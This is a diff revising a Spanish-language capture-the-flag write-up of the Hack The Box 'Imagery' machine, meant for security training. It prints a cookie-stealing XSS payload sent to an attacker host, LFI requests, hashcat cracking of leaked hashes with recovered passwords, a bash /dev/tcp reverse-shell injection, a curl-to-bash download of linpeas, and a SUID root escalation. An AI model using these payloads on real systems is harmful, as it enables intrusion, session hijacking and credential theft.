@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Imagery - Hack The Box
-excerpt: "Imagery aloja una aplicación de galería de imágenes basada en Flask. Explotaremos una vulnerabilidad de XSS persistente (stored XSS) en la función de reporte de errores para robar una cookie de administrador."
+excerpt: "Imagery es una máquina de dificultad Medium que aloja una galería de imágenes basada en Flask. La intrusión comienza explotando una vulnerabilidad de Stored XSS en el sistema de reporte de errores, lo que nos permitirá secuestrar la cookie de sesión del administrador. Tras obtener acceso, aprovecharemos una vulnerabilidad de Local File Inclusion (LFI) en el lector de logs para extraer el código fuente. Finalmente, tras auditar el código, lograremos una Inyección de Comandos (RCE) en el módulo de edición de imágenes para obtener ejecución remota en el servidor."
 date: 2026-02-25
 classes: wide
 header:
@@ -13,19 +13,49 @@ categories:
   - infosec
 tags:
   - linux
-  - XSS
-  - LFI
-  - RCE
+  - python-flask
+  - pyaescrypt
+  - aescrypt
+  - xss
+  - lfi
+  - rce
+  - md5-cracking
+  - aes-crypt-cracking
 ---
 
-Imagery aloja una aplicación de galería de imágenes basada en Flask. Explotaremos una vulnerabilidad de XSS persistente (stored XSS) en la función de reporte de errores para robar una cookie de administrador. Por medio de la función de obtener los logs filtraremos in local file inclusion para obtener el código fuente de la aplicación donde finalmente haremos una inyección de comandos en la función que transforma o edita las imágenes.
+# About
 
-# 1. Enumeración y Reconocimiento
+**Imagery** es una máquina de dificultad **Medium** que aloja una galería de imágenes basada en **Flask**. La intrusión comienza explotando una vulnerabilidad de **Stored XSS** en el sistema de reporte de errores, lo que nos permitirá secuestrar la cookie de sesión del administrador. Tras obtener acceso, aprovecharemos una vulnerabilidad de **Local File Inclusion (LFI)** en el lector de logs para extraer el código fuente. Finalmente, tras auditar el código, lograremos una **Inyección de Comandos (RCE)** en el módulo de edición de imágenes para obtener ejecución remota en el servidor.
 
-Iniciamos con una fase de reconocimiento activo utilizando nmap para identificar la superficie de ataque. El objetivo es descubrir servicios en ejecución y versiones específicas que puedan presentar debilidades.
+# Contents
+- [1. Enumeration](#1-enumeration)
+    - [1.1 Full Port Scan](#11-full-port-scan)
+    - [1.2 Service/Version Detention](#12-serviceversion-detention)
+    - [1.3 Virtual Host](#13-virtual-host)
+- [2. Exploitation](#2-exploitation)
+    - [2.1 Cross-Site Scripting (XSS)](#21-cross-site-scripting-xss)
+        - [2.1.1 Session Hijacking](#211-session-hijacking)
+    - [2.2 Local File Inclusion (LFI)](#22-local-file-inclusion-lfi)
+        - [2.2.1 Web Fuzzing con Burp Suite](#221-web-fuzzing-con-burp-suite)
+        - [2.2.2 Source Code](#222-source-code)
+    - [2.3 Remote Code Execution(RCE)](#23-remote-code-executionrce)
+         - [2.3.1 Users Hashes](#231-users-hashes)
+         - [2.3.2 Web Shell](#232-web-shell)
+- [3. Post Explotacion](#3-post-explotacion)
+    - [3.1 Enumeration](#31-enumeration)
+    - [3.2 Cracking AES Encryption](#32-cracking-aes-encryption)
+        - [3.2.1 Users hashes](#321-users-hashes)
+    - [3.3 Privilege Escalation](#33-privilege-escalation)
 
-## 1.1 Escaneo de todos los puertos (Full Port Scan)
-Ejecutamos un escaneo inicial sobre el rango completo de puertos TCP (1-65535) para asegurar que no pasamos por alto ningún servicio oculto en puertos no estándar.
+
+# 1. Enumeration
+
+Iniciamos con una fase de reconocimiento activo para identificar la superficie de ataque. El objetivo es descubrir servicios en ejecución y versiones específicas que puedan presentar debilidades.
+
+## 1.1 Full Port Scan
+
+Ejecutamos un escaneo inicial sobre el rango completo de puertos `TCP (1-65535)` para asegurar que no pasamos por alto ningún servicio oculto en puertos no estándar.
+
 ```
 nmap -p- -vvv --min-rate 5000 10.129.242.164
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-19 14:46 -05
@@ -44,8 +74,10 @@ PORT      STATE  SERVICE          REASON
 22/tcp    open   ssh              syn-ack
 8000/tcp  open   http-alt         syn-ack ttl 63
 ```
-## 1.2 Detección de Servicios y Versiones
-Una vez identificados los puertos abiertos, realizamos un escaneo más profundo utilizando los flags -sC (scripts por defecto) y -sV (detección de versiones).
+
+## 1.2 Service/Version Detention
+
+Una vez identificados los puertos abiertos, realizamos un escaneo más profundo utilizando los flags `-sC` (scripts por defecto) y `-sV` (detección de versiones).
 
 ```
 nmap -p 22,8000 -sCV 10.129.242.164
@@ -62,11 +94,11 @@ PORT     STATE SERVICE  VERSION
 |_http-server-header: Werkzeug/3.1.3 Python/3.12.7
 ```
 
-## 1.3 Configuración del Virtual Host
+## 1.3 Virtual Host
 
-Dado que el servidor web puede estar configurado para responder a un nombre de dominio específico, es necesario mapear la dirección IP de la instancia al nombre de dominio imagery.htb. Esto permite que el navegador (o herramientas como curl) envíe el encabezado HTTP Host correcto.
+Dado que el servidor web puede estar configurado para responder a un nombre de dominio específico, es necesario mapear la dirección IP de la instancia al nombre de dominio **imagery.htb**. Esto permite que el navegador (o herramientas como curl) envíe el encabezado HTTP Host correcto.
 
-Modificamos el archivo `/etc/hosts` de nuestro sistema atacante:
+Modificamos el archivo `/etc/hosts` de nuestra maquina local:
 
 ```
 echo "10.129.243.164 imagery.htb" | sudo tee -a /etc/hosts
@@ -79,27 +111,27 @@ Al acceder a `http://imagery.htb:8000`, nos encontramos con una plataforma de ge
 - **Registro**: Navegamos al endpoint `/register` para crear un nuevo perfil.
 - **Autenticación**: Una vez registrados, iniciamos sesión en el panel de `/login`
 
-# 2. Explotacion
+# 2. Exploitation
 
-## 2.1 Cross-Site Scripting (XSS) persistente
+## 2.1 Cross-Site Scripting (XSS)
 
-Durante la auditoría del panel de usuario, identificamos que el formulario en la ruta `/admin/bug_reports` no sanitiza correctamente la entrada del campo **Bug Details**. Al ser un reporte que será visualizado por un usuario con privilegios elevados (administrador), esto representa un vector de **Stored XSS**.
+Durante la auditoría del panel de usuario, identificamos que el formulario en el path `/admin/bug_reports` no sanitiza correctamente la entrada del campo **Bug Details**. Al ser un reporte que será visualizado por un usuario con privilegios elevados (administrador), esto representa un vector de **Stored XSS**.
 
-Para explotar esta vulnerabilidad y obtener la cookie de sesión del administrador, preparamos un servidor de escucha en nuestra máquina local:
+Para explotar esta vulnerabilidad y obtener la **cookie** de sesión del administrador, enviaremos un reporte de error inyectando un payload diseñado para forzar al navegador de la víctima a redirigirse a nuestro servidor.
+
+En nuestra máquina local:
 
 ```
 python -m http.server 8080
 ```
 
-Posteriormente, enviamos un reporte de error inyectando un payload diseñado para forzar al navegador de la víctima a redirigirse a nuestro servidor, adjuntando sus cookies en la URL:
-
-**Payload inyectado**:
+**Payload**:
 
 ```html
 <img src=/ onerror="document.location='http://{ip_atacante}:8080/'+document.cookie" />
 ```
 
-Para automatizar o replicar esta acción, podemos interceptar la petición y utilizar el siguiente fetch desde la consola del navegador:
+Para automatizar o replicar esta acción, podemos interceptar la petición y ejecutarla desde la consola del navegador:
 
 ```js
 await fetch("http://imagery.htb:8000/report_bug", {
@@ -114,7 +146,7 @@ await fetch("http://imagery.htb:8000/report_bug", {
 });
 ```
 
-Una vez que el administrador accede al reporte para revisarlo, su navegador ejecuta el código malicioso. Recibimos la siguiente petición en nuestro servidor:
+Una vez que el administrador accede al reporte para revisarlo, su navegador ejecuta el código malicioso agregando la cookie sesión en la URL.
 
 ```
 python -m http.server 8080
@@ -125,17 +157,17 @@ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 10.129.242.164 - - [19/Feb/2026 16:46:11] "GET /favicon.ico HTTP/1.1" 404 -
 ```
 
-Al no tener la flag `HttpOnly` incluida en el encabezado `HTTP Set-Cookie` deja a la aplicación expuesta a ataques de **Cross-Site Scripting (XSS)** y secuestro de sesión. 
+Al no tener la flag `HttpOnly` incluida en el encabezado `HTTP Set-Cookie` deja a la aplicación expuesta a ataques de **Cross-Site Scripting (XSS)** y **Session Hijacking**(*secuestro de sesión*).
 
-Con esta cookie, procedemos a suplantar la identidad del administrador en el navegador para acceder a funciones restringidas. 
+Con esta cookie, procedemos a suplantar la identidad del administrador en el navegador para acceder a funciones restringidas.
 
-### 2.1.1 Secuestro de sesion
+### 2.1.1 Session Hijacking
 
-Con la cookie de sesión del administrador en nuestro poder, procedemos a realizar un **Session Hijacking**. Para ello, interceptamos la sesión actual en el navegador (vía DevTools > Storage) y sustituimos el valor de nuestra cookie `session` por el token capturado.
+Procedemos a realizar un **Secuestro de sesión**. Para ello, interceptamos la sesión actual en el navegador `(DevTools > Storage)` y sustituimos el valor de nuestra cookie sesión por el token capturado.
 
 ![](/assets/images/htb-writeup-imagery/secuestroSesion.png)
 
-Tras refrescar la página, el servidor nos reconoce como el usuario **admin@imagery.htb**. Al explorar el panel administrativo, identificamos nuevas funcionalidades críticas:
+El servidor nos reconoce como el usuario **admin@imagery.htb**. Al explorar el panel administrativo, identificamos nuevas funcionalidades críticas:
 
 - Gestión de usuarios (Eliminación).
 - Visualización y borrado de reportes de errores.
@@ -157,15 +189,15 @@ Al analizar  el **Path** `/admin/get_system_log` y su **Query scrign** `?log_ide
 
 Si el servidor no sanitiza correctamente esta entrada (por ejemplo, mediante el uso de `os.path.join` sin validar secuencias de escape), estaríamos ante una vulnerabilidad de **Local File Inclusion (LFI)** o **Arbitrary File Read**.
 
-Para confirmarlo, realizamos una fase de **Web Fuzzing** sobre el parámetro `log_identifier`. El objetivo es identificar si la aplicación permite el salto de directorios utilizando caracteres especiales (`../`).
+Para confirmarlo, realizamos una fase de **Web Fuzzing** sobre el parámetro `log_identifier`.
 
 ### 2.2.1 Web Fuzzing con Burp Suite
 
 Para validar el alcance del LFI, utilizamos el módulo **Intruder** de Burp Suite configurado en modo Sniper. Empleamos la wordlist [SecList/Fuzzing/LFI/LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), la cual contiene una amplia variedad de secuencias de salto de directorio y archivos conocidos de Linux.
 
-Encontramos que podemos descargar y ver los directorios estandares del sistema.
+Encontramos que podemos descargar y ver los directorios estándares del sistema.
 
-- `/etc`: Confirmamos el Path Traversal al recuperar con éxito `/etc/group`. Este archivo nos reveló la existencia de un usuario de sistema `web:x:1001:` (UID 1001), sugiriendo que la aplicación no corre bajo el contexto de `root`, sino de un usuario dedicado llamado **web**.
+- `/etc`: Confirmamos el Path Traversal al recuperar con éxito `/etc/group`. Este archivo nos reveló la existencia de un usuario de sistema `web:x:1001:` (UID 1001), sugiriendo que la aplicación no corre bajo el contexto de `root`, sino de un usuario llamado **web**.
   - `/etc/passwd` 
   - `/etc/hosts`
   - `/etc/crontab`
@@ -179,17 +211,15 @@ Encontramos que podemos descargar y ver los directorios estandares del sistema.
   ![](/assets/images/htb-writeup-imagery/lfi-proc.png)
 
 
-### 2.2.2 Codigo fuente
+### 2.2.2 Source Code
 
-Tras confirmar la ruta del usuario en las variables de entorno, procedemos a exfiltrar el archivo principal de la aplicación. En un entorno Flask, el archivo `app.py` suele actuar como el orquestador de la lógica del servidor.
-
-Utilizamos `curl` para descargar el código, autenticándonos con la cookie de administrador secuestrada:
+En un entorno Flask, el archivo `app.py` suele actuar como el orquestador de la lógica del servidor.
 
 ```
 curl -s -O -b 'session={admin_cookie}' http://imagery.htb:8000/admin/get_system_log?log_identifier=/home/web/web/app.py
 ```
 
-Se confirma que `SESSION_COOKIE_HTTPONLY` está explícitamente en False, lo que permitió nuestro ataque inicial de XSS
+Se confirma que `SESSION_COOKIE_HTTPONLY` está explícitamente en False, lo que permitió nuestro ataque inicial de XSS.
 
 ```py
 from flask import Flask, render_template
@@ -211,7 +241,7 @@ app_core.secret_key = os.urandom(24).hex()
 app_core.config['SESSION_COOKIE_HTTPONLY'] = False
 ```
 
-La aplicación importa módulos específicos para cada función. Basándonos en nuestra hoja de ruta inicial:
+La aplicación importa módulos específicos para cada función.
 
 - `config.py`
 - `utils.py`
@@ -233,21 +263,12 @@ UPLOAD_FOLDER = 'uploads'
 SYSTEM_LOG_FOLDER = 'system_logs'
 ```
 
-`config.py` define `DATA_STORE_PATH = 'db.json'`. Al descargar este archivo, obtenemos los hashes de las contraseñas de los usuarios. Aunque ya tenemos acceso como administrador, vemos el hash del usuario **testuser@imagery.htb** podría ser util para persistencia o movimiento lateral (pudiendo ser crackeados con *John the Ripper* o *Hashcat*).
+`config.py` define `DATA_STORE_PATH = 'db.json'`. Al descargar este archivo, obtenemos los hashes de las contraseñas de los usuarios.
 
 ```json
 {
     "users": [
-        {
-            "username": "admin@imagery.htb",
-            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
-            "isAdmin": true,
-            "displayId": "a1b2c3d4",
-            "login_attempts": 0,
-            "isTestuser": false,
-            "failed_login_attempts": 0,
-            "locked_until": null
-        },
+        ...
         {
             "username": "testuser@imagery.htb",
             "password": "2c65c8d7bfbca32a3ed42596192384f6",
@@ -259,12 +280,13 @@ SYSTEM_LOG_FOLDER = 'system_logs'
             "locked_until": null
         }
     ]
+    ...
 }
 ```
 
-## 2.3 Remote Code Execution( RCE)
+## 2.3 Remote Code Execution(RCE)
 
-Analicemos el metodo `apply_visual_transform()` de `api_edit.py`
+Analicemos el método `apply_visual_transform()` de `api_edit.py`.
 
 ```py
 @bp_edit.route('/apply_visual_transform', methods=['POST'])
@@ -281,9 +303,6 @@ def apply_visual_transform():
         return jsonify({'success': False, 'message': 'Image ID and transform type are required.'}), 400
     ...
     try:
-        unique_output_filename = f"transformed_{uuid.uuid4()}.{original_ext}"
-        output_filename_in_db = os.path.join('admin', 'transformed', unique_output_filename)
-        output_filepath = os.path.join(UPLOAD_FOLDER, output_filename_in_db)
         if transform_type == 'crop':
             x = str(params.get('x'))
             y = str(params.get('y'))
@@ -310,16 +329,16 @@ def apply_visual_transform():
         ...
 ```
 
-Identificamos una vulnerabilidad crítica en el endpoint `/apply_visual_transform`. Aunque la función está restringida a usuarios con el atributo `is_testuser_account` (el cual confirmamos que posee el usuario **testuser@imagery.htb** en db.json), un administrador puede interactuar con ella si la lógica de sesión lo permite o si se suplanta a dicho usuario.
+Identificamos una vulnerabilidad crítica en el path `/apply_visual_transform`. Aunque la función está restringida a usuarios con el atributo `is_testuser_account` (el cual confirmamos que posee el usuario **testuser@imagery.htb** en `db.json`).
 
-Como vemos en el codigo fuente, este metodo tiene varias acciones para transformar una imagen: 
+Como vemos en el código fuente, este método tiene varias acciones para transformar una imagen: 
 - `crop`: Recortar
 - `rotate`: Girar / Rotar
 - `saturation`: Saturacion
 - `brightness`: Brillo
 - `contrast`: Constraste
 
-Analicemos el condicional de la accion de recortar.
+Analicemos el condicional de la acción de **recortar**.
 
 ```py
 if transform_type == 'crop':
@@ -331,13 +350,13 @@ if transform_type == 'crop':
     subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
 ```
 
-El desarrollador en este punto utiliza **ImageMagick** que es una suite de linea de comandos para procesar imagenes. Las variables `x`, `y`, `width` y `height` provienen directamente del input del usuario (`request.get_json()`) sin ningún tipo de saneamiento o validación numérica.
+El desarrollador en este punto utiliza **ImageMagick** que es una suite de línea de comandos para procesar imágenes. Las variables `x`, `y`, `width` y `height` provienen directamente del input del usuario (`request.get_json()`) sin ningún tipo de **saneamiento** o **validación numérica**.
 
 Al ejecutar `subprocess.run` con el argumento `shell=True`, Python invoca `/bin/sh` para interpretar la cadena command. Esto permite el uso de metacaracteres de shell (como `;`, `&&`, `|`) para encadenar comandos arbitrarios.
 
-Para explotar esto, necesitamos que el parámetro `x` rompa la sintaxis del comando original, haciendo que la concatenacion referenciada en la variable `command` solo tome el valor de `x` para poder inyectar un comando del sistema operativo y hacernos con el servidor web via `rever shell`.
+Para explotar esto, necesitamos que el parámetro `x` rompa la sintaxis del comando original, haciendo que la concatenación referenciada en la variable `command` solo tome el valor de `x` para poder inyectar un comando del sistema operativo y hacernos con el servidor web vía `reverse shell`.
 
-Mientras que las otras funciones (`rotate`, `saturation`, etc.) utilizan una lista de argumentos en `subprocess.run` (lo cual es seguro), la función `crop` usa una `f-string` vulnerable.
+Las otras funciones (`rotate`, `saturation`, etc.) utilizan una lista de argumentos en `subprocess.run` (lo cual es seguro), la función `crop` usa una `f-string` vulnerable.
 
 **Ejemplo**:
 
@@ -358,38 +377,35 @@ x = "; ls -l #"
 
 command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
 
-# IMPORTANTE: shell=True es obligatorio para que esto funcione
 subprocess.run(command, shell=True)
 ```
 
 En este script vemos que es posible romper la cadena y usar `x` como inyector.
 
-### 2.3.1  Rompimiento de Hashes (Cracking)
+### 2.3.1 Users Hashes
 
 Para explotar la inyección de comandos, la aplicación requiere que la sesión activa tenga el atributo `is_testuser_account` habilitado. Este flag se activa al autenticarse como el usuario **testuser@imagery.htb**.
 
-Utilizamos los hashes MD5 obtenidos previamente del archivo `db.json` y procedemos a realizar un ataque de diccionario utilizando **Hashcat** y la wordlist `rockyou.txt`:
+Con el hash extraído, ejecutamos un ataque de fuerza bruta basado en diccionario y el modo específico para **MD5** `(-m 0)`:
 
 ```
-hashcat "2c65c8d7bfbca32a3ed42596192384f6" -m 0 -a 0 /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt
+hashcat "2c65c8d7bfbca32a3ed42596192384f6" -m 0 /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt
 ```
 
 - **Password**: iambatman
 
-Con estas credenciales, cerramos la sesión de administrador e iniciamos sesión como **testuser@imagery.htb**. Ahora, el servidor permitirá que nuestras peticiones al endpoint `/apply_visual_transform` procesen las transformaciones de imagen, desbloqueando nuestro vector de **RCE**.
-
 ### 2.3.2 Web Shell
 
-Para disparar la vulnerabilidad de inyección de comandos, es requisito que el usuario cuente con al menos una imagen previa en su galería, permitiendo así invocar la peticion `/apply_visual_transform`. El objetivo es forzar al servidor a web ejecutar una **Reverse Shell**.
+Para disparar la vulnerabilidad de inyección de comandos, el usuario con una imagen en su galería, permitiendo así invocar la petición `/apply_visual_transform`. El objetivo es forzar al servidor a web ejecutar una **Reverse Shell**.
 
-En nuestra máquina de ataque, inicializamos un listener con **Netcat** para capturar la comunicación entrante:
+En nuestra máquina local:
 
 ```
 nc -lvnp 8080
 Listening on 0.0.0.0 8080
 ```
 
-Para que el servidor web se conecte hacia nuentra maquina haremos uso del siguiente payload:
+**Payload**:
 
 ```
 ; bash -c 'bash -i >& /dev/tcp/{IP_ATACANTE}/{PUERTO} 0>&1' #
@@ -401,7 +417,7 @@ Para que el servidor web se conecte hacia nuentra maquina haremos uso del siguie
 
 - `0>&1`: Redirige la entrada estándar (`stdin`) al mismo descriptor de archivo, permitiendo que los comandos que enviemos desde Netcat sean ejecutados por la shell de la víctima.
 
-Procedemos a capturar el fetch de la peticion `/apply_visual_transform`, inyectar el payload en el parametro `x` y ejecutamos el fetch en la consala del navegador.
+Procedemos a capturar la petición `/apply_visual_transform`, inyectar el payload en el parámetro `x` y ejecutarla en la consola del navegador. 
 
 ```js
 await fetch("http://imagery.htb:8000/apply_visual_transform", {
@@ -425,7 +441,7 @@ await fetch("http://imagery.htb:8000/apply_visual_transform", {
 });
 ```
 
-Al procesar la solicitud, el servidor ejecuta nuestra cadena maliciosa bajo el contexto del usuario **web**, estableciendo el túnel de control:
+Al procesar la solicitud, el servidor ejecuta nuestra cadena maliciosa bajo el contexto del usuario **web**, conectándose hacia nuestra máquina y estableciendo el túnel de control:
 
 ```
 nc -lvnp 8080
@@ -439,9 +455,10 @@ uid=1001(web) gid=1001(web) groups=1001(web)
 
 # 3. Post Explotacion
 
+## 3.1 Enumeration
 Procedemos con la fase de enumeración local para identificar vectores de escalada de privilegios. Para agilizar este proceso, utilizaremos la herramienta **LinPEAS**, un script automatizado que busca desconfiguraciones, archivos sensibles y vulnerabilidades en el kernel.
 
-En nuestra máquina de ataque, preparamos el binario y levantamos un servidor web temporal con Python para servir el archivo:
+En nuestra máquina de ataque, preparamos el binario y levantamos un servidor web para disponibilizar el archivo:
 
 ```
 wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh && python -m http.server 8000
@@ -453,7 +470,7 @@ Desde el servidor web, descargamos y ejecutamos el script directamente en memori
 curl -s http://{IP_ATACANTE}:8000/linpeas.sh | bash
 ```
 
-Durante la enumeración, el script resalta un hallazgo crítico en el directorio `/var/backup``. Se trata de un archivo comprimido y cifrado mediante el algoritmo AES, el cual posee permisos de lectura para todos los usuarios:
+Durante la enumeración, el script resalta un hallazgo crítico en el directorio `/var/backup`. Se trata de un archivo comprimido y cifrado mediante el algoritmo **AES Encryption**, el cual posee permisos de lectura para todos los usuarios:
 
 ```
 web@Imagery:/var/backup$ ll
@@ -463,7 +480,7 @@ drwxr-xr-x 14 root root     4096 Sep 22 18:56 ../
 -rw-rw-r--  1 root root 23054471 Aug  6  2024 web_20250806_120723.zip.aes
 ```
 
-Enviamos el archivo a máquina local para realizar un análisis forense. Para ello, empleamos **Netcat** para establecer una transferencia de archivos punto a punto
+Enviamos el archivo a nuestra máquina local para realizar un análisis forense. Para ello, establecemos una transferencia de archivos punto a punto.
 
 ```
 nc -lvnp 8000 > backup_web.zip.aes
@@ -475,7 +492,7 @@ Desde el servidor web:
 web@Imagery:/var/backup$ nc {IP_ATACANTE} 8000 < web_20250806_120723.zip.aes
 ```
 
-## 3.1 Cracking AES Encryption
+## 3.2 Cracking AES Encryption
 
 Para determinar la naturaleza real del archivo, usaremos el comando `file`. Para identificar el tipo de archivo mediante el análisis de su cabecera y "números mágicos". 
 
@@ -484,10 +501,7 @@ file backup_web.zip.aes
 backup_web.zip.aes: AES encrypted data, version 2, created by "pyAesCrypt 6.1.1"
 ```
 
-Revela que fue creado con **pyAesCrypt 6.1.1**, que es un modulo y script de línea de comandos de python diseñado para cifrar y desifar archivos algoritmo **AES-256 en modo CBC**. 
-
-
-Instalamos la utilidad [AES Crypt](https://www.aescrypt.com/download/) en nuestra máquina. Sin embargo, al intentar el descifrado, el sistema solicita una contraseña:
+Instalamos la CLI oficial de [AES Crypt](https://www.aescrypt.com/download/) en nuestra máquina. Sin embargo, al intentar el descifrado, el sistema solicita una contraseña:
 
 ```
 aescrypt
@@ -496,7 +510,7 @@ aescrypt -d backup_web.zip.aes
 Enter password: 
 ```
 
-Para recuperar la clave, utilizaremos el script `aescrypt2hashcat.pl` del repositorio oficial de [Hashcat Tools](https://github.com/hashcat/hashcat/blob/master/tools). Este script extrae hash archivo `.aes`.
+Para recuperar la clave, utilizaremos el script `aescrypt2hashcat.pl` del repositorio oficial de [Hashcat Tools](https://github.com/hashcat/hashcat/blob/master/tools). Este script extrae hash de archivos `.aes`.
 
 ```
 perl aescrypt2hashcat.pl backup_web.zip.aes  > backup_web_hash.txt
@@ -505,7 +519,7 @@ cat backup_web_hash.txt
 $aescrypt$1*98b981e1c146c078b5462f09618b1341*0dd95827498496b8c8ca334d99b13c28*10c6eeb86b1d71475fc5d52ed52d67c20bd945d53b9ac0940866bc8dfbba72c1*e042d41d09ac2726044d63af1276c49e2c8d5f9eb9da32e58bf36cf4f0ad9c6
 ```
 
-Con el hash extraído, ejecutamos un ataque de fuerza bruta basado en diccionario y el modo específico para **AES Crypt** `(-m 22400)`:
+Con el hash extraído, ejecutamos un ataque de fuerza bruta basado en diccionario y modo específico para **AES Crypt** `(-m 22400)`:
 
 ```
 hashcat -m 22400 backup_web_hash.txt /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
@@ -513,7 +527,7 @@ hashcat -m 22400 backup_web_hash.txt /usr/share/SecLists/Passwords/Leaked-Databa
 
 - **Password**: bestfriends
 
-## 3.2 Análisis del Backup y Extracción de Credenciales
+### 3.2.1 Users hashes
 
 Tras obtener la contraseña, desciframos y descomprimimos el contenido para inspeccionar los archivos del proyecto:
 
@@ -528,7 +542,7 @@ unzip backup_web.zip
 cat backup_web.zip
 ```
 
-Al explorar la estructura del backup, localizamos el archivo `db.json``, el cual actúa como base de datos de la aplicación y contiene información sensible de los usuarios:
+Al explorar la estructura del backup, localizamos el archivo `db.json`, el cual actúa como base de datos de la aplicación y contiene información sensible de los usuarios:
 
 ```json
 {
@@ -548,16 +562,18 @@ Al explorar la estructura del backup, localizamos el archivo `db.json``, el cual
 }
 ```
 
-Con el hash obtenido, ejecutamos un ataque de fuerza bruta basado en diccionario y modo específico para **MD5** `(-m 0 )``
+Con el hash extraído, ejecutamos un ataque de fuerza bruta basado en diccionario y modo específico para **MD5** `(-m 0)`:
 
 ```
 hashcat "01c3d2e5bdaf6134cec0a367cf53e535" -m 0 /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
 ```
 - **Password**: supersmash
 
-## 3.3 Escalacion de privilegios
+## 3.3 Privilege Escalation
 
-Tras comprometer la cuenta del usuario mark, procedemos a la enumeración del sistema en busca de vectores de escalada vertical.
+Tras comprometer la cuenta del usuario **mark@imagery.htb**, procedemos a la enumeración del sistema en busca de vectores de escalada vertical.
+
+El el servidor web con autenticados como mark:
 
 ```
 mark@Imagery:~$ ls
@@ -574,7 +590,7 @@ User mark may run the following commands on Imagery:
     (ALL) NOPASSWD: /usr/local/bin/charcol
 ```
 
-El usuario puede ejecutar `/usr/local/bin/charcol`` con privilegios de **root** sin requerir contraseña.
+El usuario puede ejecutar `/usr/local/bin/charcol` con privilegios de **root** sin requerir contraseña.
 
 ```
 mark@Imagery:~$ sudo charcol -R
@@ -603,19 +619,13 @@ charcol>help
           (will prompt for system password)
 ```
 
-Al inspeccionar el manual de ayuda, indica explícitamente que la herramienta no valida la **seguridad de los comandos ejecutados**, lo que permite una **inyección de comandos arbitrarios** con los privilegios del binario (root).
+Al inspeccionar el manual de ayuda, indica explícitamente que la herramienta no valida la **seguridad de los comandos ejecutados**.
 
-
-
-Haremos uso de la instruccion `auto`, para programar un job que ejecute un comando que nos devuelva una shell de bash en modo root.
-
-Para elevar privilegios, programaremos un schedule job que asigne el bit **SUID** al binario `/bin/bash`.
+Haremos uso de la instrucción `auto`, para programar un schedule job que ejecutar la asignación del bit **SUID** al binario `/bin/bash` para que nos devuelva una shell de bash en modo root.
 
 ```
 charcol> auto add --schedule "* * * * *" --command "chmod u+s /bin/bash" --name "pwn" --log-output "/home/mark/pwn.log"
 ```
-
-Esto nos permitirá ejecutar una shell con el identificador del usuario root:
 
 ```
 mark@Imagery:~$ /bin/bash -p
@@ -625,4 +635,4 @@ uid=1002(mark) gid=1002(mark) euid=0(root) egid=0(root) groups=0(root),1002(mark
 
 **Hemos tomado control total del servidor.**
 
-**ADVERTENCIA**: El contenido de este **write-up** tiene fines exclusivamente educativos y éticos. El uso de estas técnicas en sistemas sin autorización previa es ilegal y está penado por la ley.
+*Este contenido tiene fines exclusivamente **éticos** y **educativos** . El uso de estas técnicas en sistemas sin autorización previa es ilegal.*
